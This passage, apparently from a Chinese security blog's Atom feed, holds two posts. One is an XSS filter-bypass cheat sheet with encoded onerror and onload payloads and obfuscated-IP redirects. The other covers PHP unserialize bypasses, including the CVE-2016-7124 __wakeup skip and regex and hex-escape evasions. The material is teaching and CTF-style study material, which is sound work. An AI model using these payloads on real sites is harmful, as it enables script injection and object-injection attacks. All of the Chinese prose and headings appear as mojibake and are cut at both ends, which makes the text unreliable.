class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="asciiç ç»•è¿‡"><a class="markdownIt-Anchor" href="#asciiç ç»•è¿‡">#</a> Ascii ç ç»•è¿‡</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="hexç»•è¿‡"><a class="markdownIt-Anchor" href="#hexç»•è¿‡">#</a> hex ç»•è¿‡</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="å…«è¿›åˆ¶"><a class="markdownIt-Anchor" href="#å…«è¿›åˆ¶">#</a> å…«è¿›åˆ¶</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="base64ç»•è¿‡"><a class="markdownIt-Anchor" href="#base64ç»•è¿‡">#</a> base64 ç»•è¿‡</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="3è¿‡æ»¤å¼•å·"><a class="markdownIt-Anchor" href="#3è¿‡æ»¤å¼•å·">#</a> 3. è¿‡æ»¤å¼•å·</h3><p>1. å¦‚æœæ˜¯ html æ ‡ç­¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ç”¨å¼•å·ã€‚å¦‚æœæ˜¯åœ¨ js ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·ä»£æ›¿å•åŒå¼•å·</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>`<span class="attr">xss</span>`);&gt;</span></span><br></pre></td></tr></table></figure></div><p>2. ä½¿ç”¨ç¼–ç ç»•è¿‡ï¼Œå…·ä½“çœ‹ä¸Šé¢æˆ‘åˆ—ä¸¾çš„ä¾‹å­</p><h3 id="4è¿‡æ»¤æ‹¬å·"><a class="markdownIt-Anchor" href="#4è¿‡æ»¤æ‹¬å·">#</a> 4. è¿‡æ»¤æ‹¬å·</h3><p>ä½¿ç”¨ throw ç»•è¿‡</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure></div><h3 id="5è¿‡æ»¤urlåœ°å€"><a class="markdownIt-Anchor" href="#5è¿‡æ»¤urlåœ°å€">#</a> 5. è¿‡æ»¤ url åœ°å€</h3><h4 id="ä½¿ç”¨urlç¼–ç "><a class="markdownIt-Anchor" href="#ä½¿ç”¨urlç¼–ç ">#</a> ä½¿ç”¨ url ç¼–ç </h4><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">2e</span>%<span class="attr">62</span>%<span class="attr">61</span>%<span class="attr">69</span>%<span class="attr">64</span>%<span class="attr">75</span>%<span class="attr">2e</span>%<span class="attr">63</span>%<span class="attr">6f</span>%<span class="attr">6d</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="ä½¿ç”¨ip"><a class="markdownIt-Anchor" href="#ä½¿ç”¨ip">#</a> ä½¿ç”¨ IP</h4><p>1. åè¿›åˆ¶ IP</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">2130706433</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><p>2. å…«è¿›åˆ¶ IP</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0177.0.0.01</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><p>3.hex</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><p>4.html æ ‡ç­¾ä¸­ç”¨ <code>//</code>  å¯ä»¥ä»£æ›¿ <code>http://</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`//<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure></div><p>6. ä½¿ç”¨ä¸­æ–‡é€—å·ä»£æ›¿è‹±æ–‡é€—å·<br>å¦‚æœä½ åœ¨ä½ åœ¨åŸŸåä¸­è¾“å…¥ä¸­æ–‡å¥å·æµè§ˆå™¨ä¼šè‡ªåŠ¨è½¬åŒ–æˆè‹±æ–‡çš„é€—å·</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;document.location=`http://wwwã€‚baiduã€‚com`&quot;</span>&gt;</span>//ä¼šè‡ªåŠ¨è·³è½¬åˆ°ç™¾åº¦</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#xss&quot;&gt;#&lt;/a&gt; XSS&lt;/h1&gt;
&lt;h2 id=&quot;è·¨ç«™è„šæœ¬æ”»å‡»&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#è·¨ç«™è„šæœ¬æ”»å‡»&quot;&gt;#&lt;/a&gt; è·¨ç«™è„šæœ¬æ”»</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PHP Unserialize</title>
    <link href="http://example.com/2024/04/09/PHP-Unserialize/"/>
    <id>http://example.com/2024/04/09/PHP-Unserialize/</id>
    <published>2024-04-09T13:51:55.000Z</published>
    <updated>2024-04-11T12:30:08.434Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php-unserialize"><a class="markdownIt-Anchor" href="#php-unserialize">#</a> PHP Unserialize</h1><h2 id="ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–">#</a> ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h2><p><strong>serialize</strong> å°†å¯¹è±¡æ ¼å¼åŒ–æˆæœ‰åºçš„å­—ç¬¦ä¸²</p><p><strong>unserialize</strong> å°†å­—ç¬¦ä¸²è¿˜åŸæˆåŸæ¥çš„å¯¹è±¡</p><h3 id="serializeçš„ç‰¹å¾"><a class="markdownIt-Anchor" href="#serializeçš„ç‰¹å¾">#</a> serialize çš„ç‰¹å¾</h3><p>å¸¸è§çš„åºåˆ—åŒ–æ ¼å¼æœ‰</p><blockquote><p>äºŒè¿›åˆ¶æ ¼å¼</p><p>å­—èŠ‚æ•°ç»„</p><p>json å­—ç¬¦ä¸²</p><p>xml å­—ç¬¦ä¸²</p></blockquote><p>å¸¸è§çš„æ•°ç»„æ ·ä¾‹</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">array</span>(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$user</span>.PHP_EOL);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>));</span><br></pre></td></tr></table></figure></div><p>è¾“å‡º  <code>a:3:&#123;i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;&#125;</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;&#125;</span><br><span class="line">a:arrayä»£è¡¨æ˜¯æ•°ç»„ï¼Œåé¢çš„3è¯´æ˜æœ‰ä¸‰ä¸ªå±æ€§</span><br><span class="line">i:ä»£è¡¨æ˜¯æ•´å‹æ•°æ®intï¼Œåé¢çš„0æ˜¯æ•°ç»„ä¸‹æ ‡</span><br><span class="line">s:ä»£è¡¨æ˜¯å­—ç¬¦ä¸²ï¼Œåé¢çš„4æ˜¯å› ä¸ºxiaoé•¿åº¦ä¸º4</span><br></pre></td></tr></table></figure></div><p>æ•°æ®ç±»å‹å¯¹åº”æç¤ºç¬¦</p><p><code>å­—ç¬¦ä¸²ï¼šs</code></p><p><code>å·²è½¬ä¹‰å­—ç¬¦ä¸²ï¼šS</code></p><p><code>æ•´æ•°ï¼ši</code></p><p><code>å¸ƒå°”å€¼ï¼š b</code></p><p><code>ç©ºå€¼ï¼šN</code></p><p><code>æ•°ç»„ï¼ša</code></p><p><code>å¯¹è±¡ï¼šO</code></p><p><code>å¼•ç”¨ï¼š R</code></p><p>å…³äºéå…¬æœ‰å­—æ®µåç§°:</p><ul><li><code>private</code>  ä½¿ç”¨ï¼šç§æœ‰çš„ç±»çš„åç§° (è€ƒè™‘åˆ°ç»§æ‰¿çš„æƒ…å†µ) å’Œå­—æ®µåç»„åˆ  <code>\x00ç±»åç§°\x00å­—æ®µå</code></li><li><code>protected</code>  ä½¿ç”¨:  <code>*</code>  å’Œå­—æ®µåç»„åˆ  <code>\x00*\x00å­—æ®µå</code></li></ul><h3 id="é­”æœ¯æ–¹æ³•"><a class="markdownIt-Anchor" href="#é­”æœ¯æ–¹æ³•">#</a> é­”æœ¯æ–¹æ³•</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><span class="line">__sleep() //æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><span class="line">__construct() //æ„é€ å‡½æ•°, åœ¨å¯¹åº”å¯¹è±¡å®ä¾‹åŒ–æ—¶è‡ªåŠ¨è¢«è°ƒç”¨. #å­ç±»ä¸­çš„æ„    é€ å‡½æ•°ä¸ä¼šéšå¼è°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•°.åœ¨ PHP 8 ä»¥å‰, ä¸ç±»ååŒå      çš„æ–¹æ³•å¯ä»¥ä½œä¸º __constuct è°ƒç”¨ä½† __construct æ–¹æ³•ä¼˜å…ˆ</span><br><span class="line">__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span><br><span class="line">__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®æˆ–è€…ä¸å­˜åœ¨è¿™ä¸ªé”®éƒ½ä¼šè°ƒç”¨æ­¤æ–¹æ³•</span><br><span class="line">__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><br><span class="line">__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span><br><span class="line">__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span><br><span class="line">__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span><br><span class="line">__invoke() //å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span><br><span class="line">__debugInfo() //åœ¨ä½¿ç”¨ var_dump, print_r æ—¶ä¼šè¢«è°ƒç”¨</span><br><span class="line">__set_state()   // è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨</span><br><span class="line">__clone()       // å½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</span><br><span class="line">__autoload()    // å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span><br></pre></td></tr></table></figure></div><h3 id="ååºåˆ—åŒ–ç»•è¿‡"><a class="markdownIt-Anchor" href="#ååºåˆ—åŒ–ç»•è¿‡">#</a> ååºåˆ—åŒ–ç»•è¿‡</h3><h4 id="php71ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿ"><a class="markdownIt-Anchor" href="#php71ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿ">#</a> php7.1 + ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿ</h4><p>æˆ‘ä»¬å‰é¢è¯´äº†å¦‚æœå˜é‡å‰æ˜¯ protectedï¼Œåºåˆ—åŒ–ç»“æœä¼šåœ¨å˜é‡åå‰åŠ ä¸Š <code>\x00*\x00</code></p><p>ä½†åœ¨ç‰¹å®šç‰ˆæœ¬ 7.1 ä»¥ä¸Šåˆ™å¯¹äºç±»å±æ€§ä¸æ•æ„Ÿï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­å³ä½¿æ²¡æœ‰ <code>\x00*\x00</code>  ä¹Ÿä¾ç„¶ä¼šè¾“å‡º <code>abc</code></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="ç»•è¿‡__wakeupcve-2016-7124"><a class="markdownIt-Anchor" href="#ç»•è¿‡__wakeupcve-2016-7124">#</a> ç»•è¿‡__wakeup (CVE-2016-7124)</h4><p>ç‰ˆæœ¬ï¼š</p><blockquote><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p></blockquote><p>åˆ©ç”¨æ–¹å¼ï¼šåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeup çš„æ‰§è¡Œ</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¦‚æœæ‰§è¡Œ <code>unserialize('O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;');</code>  è¾“å‡ºç»“æœä¸º <code>666</code></p><p>è€ŒæŠŠå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¢å¤§æ‰§è¡Œ <code>unserialize('O:4:&quot;test&quot;:2&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;');</code>  è¾“å‡ºç»“æœä¸º abc</p><h4 id="ç»•è¿‡éƒ¨åˆ†æ­£åˆ™"><a class="markdownIt-Anchor" href="#ç»•è¿‡éƒ¨åˆ†æ­£åˆ™">#</a> ç»•è¿‡éƒ¨åˆ†æ­£åˆ™</h4><p><code>preg_match('/^O:\d+/')</code>  åŒ¹é…åºåˆ—åŒ–å­—ç¬¦ä¸²æ˜¯å¦æ˜¯å¯¹è±¡å­—ç¬¦ä¸²å¼€å¤´ï¼Œè¿™åœ¨æ›¾ç»çš„ CTF ä¸­ä¹Ÿå‡ºè¿‡ç±»ä¼¼çš„è€ƒç‚¹</p><blockquote><p>ãƒ»åˆ©ç”¨åŠ å·ç»•è¿‡ï¼ˆæ³¨æ„åœ¨ url é‡Œä¼ å‚æ—¶ + è¦ç¼–ç ä¸º %2Bï¼‰<br>ãƒ»serialize (array (a) ) ; // a));//a));//a ä¸ºè¦ååºåˆ—åŒ–çš„å¯¹è±¡ (åºåˆ—åŒ–ç»“æœå¼€ å¤´æ˜¯ aï¼Œä¸å½±å“ä½œä¸ºæ•°ç»„å…ƒç´ çš„ $a çš„ææ„)</p></blockquote><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +å·ç»•è¿‡</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="åå…­è¿›åˆ¶ç»•è¿‡å­—ç¬¦åŒ¹é…"><a class="markdownIt-Anchor" href="#åå…­è¿›åˆ¶ç»•è¿‡å­—ç¬¦åŒ¹é…">#</a> åå…­è¿›åˆ¶ç»•è¿‡å­—ç¬¦åŒ¹é…</h4><p>å¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶æ­é…ä¸Šå·²è½¬ä¹‰å­—ç¬¦ä¸²æ¥ç»•è¿‡å¯¹æŸäº›å­—ç¬¦çš„æ£€æµ‹</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name == <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You did it!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$str</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You can&#x27;t do it!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è¿™é‡Œæ£€æµ‹äº†æ˜¯å¦åŒ…å«  <code>flag</code>  å­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨  <code>flag</code>  çš„åå…­è¿›åˆ¶  <code>\66\6c\61\67</code>  æ¥ç»•è¿‡ï¼Œæ„é€ ä»¥ä¸‹:</p><p><code>'O:4:&quot;Read&quot;:1:&#123;s:4:&quot;name&quot;;S:4:&quot;\66\6c\61\67&quot;;&#125;'</code></p><p>å¯ä»¥ç”¨ä¸‹é¢ python è„šæœ¬å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸º Hex</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>(<span class="string">&#x27;Enter a string: 